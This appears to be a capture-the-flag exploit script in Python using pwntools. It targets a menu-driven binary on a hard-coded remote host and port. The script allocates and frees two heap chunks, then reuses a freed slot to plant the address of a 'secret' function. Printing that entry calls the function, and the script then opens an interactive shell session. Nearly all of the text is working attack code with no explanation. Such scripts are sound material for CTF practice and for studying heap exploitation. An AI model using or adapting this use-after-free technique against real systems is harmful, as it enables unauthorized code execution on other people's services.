from pwn import *
# context.log_level = "debug"
# add turn 3 edit add turn 1 - > put

# p = process("./pwn")
p = remote("106.75.104.139" , 26768)
elf = ELF("./pwn")

addr_secret = elf.symbols["secret"]


def add_servent(size , name):
	p.recvuntil(":\n")
	p.sendline("1")
	p.recvuntil(": \n")
	p.sendline(str(size))
	p.recvuntil(": \n")
	p.sendline(name)
	p.recvuntil("!\n")

def del_servent(index):
	p.recvuntil(":\n")
	p.sendline("2")
	p.recvuntil(": \n")
	p.sendline(str(index))
	p.recvuntil(" \n")

def print_servent(index):
	p.recvuntil(":\n")
	p.sendline("3")
	p.recvuntil(":")
	p.sendline(str(index))

add_servent(16 , "aaaa")
add_servent(16 , "bbbb")

del_servent(0)
del_servent(1)

add_servent(8 , p32(addr_secret))

print_servent(0)

p.interactive()
